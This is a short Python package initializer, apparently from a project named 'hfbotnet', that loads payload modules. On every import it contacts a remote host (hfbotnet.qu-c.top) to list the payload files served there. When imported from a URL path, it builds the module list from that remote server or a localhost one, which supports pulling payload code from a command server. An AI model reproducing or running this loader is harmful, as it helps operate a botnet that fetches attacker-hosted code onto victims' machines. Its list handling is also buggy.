import os
from html.parser import HTMLParser
from requests import get

class LinkParser(HTMLParser):
    links = set()
    def handle_starttag(self, tag, attrs):
        if tag == 'a':
            attrs = dict(attrs)
            self.links.add(attrs.get('href').rstrip('/'))

def getlink(parser = LinkParser(), url="http://hfbotnet.qu-c.top:201/root/hfbotnet/payloads/"):
    parser.feed(get(url).text)
    links = list(parser.links)
    for link in links:
        if link.split(".")[-1] != "py":
            links.remove(link)
    links.remove("__init__.py")
    var = 0
    for link in links:
        links[var] = links[var].replace(".py", "")
        var += 1
    return links

def listdir(path=os.path.dirname(__file__)):
    __all__ = []
    for file in os.listdir(path):
        file_path = os.path.join(path, file)
        if os.path.isdir(file_path):
            pass
        elif os.path.splitext(file_path)[1]=='.py' and file != "__init__.py":
            __all__.append(file.replace(".py", ""))
    return __all__

print("[REMOTE] All remote packages: {}".format(getlink()))

if "http://" not in os.path.dirname(__file__):
    __all__ = listdir()
else:
    if "127.0.0.1" in os.path.dirname(__file__) or "localhost" in os.path.dirname(__file__):
        print("[REMOTE] URL: {}".format(os.path.dirname(__file__)))
        __all__ = getlink(url="http://127.0.0.1:333/payloads/")
    else:
        __all__ = getlink()
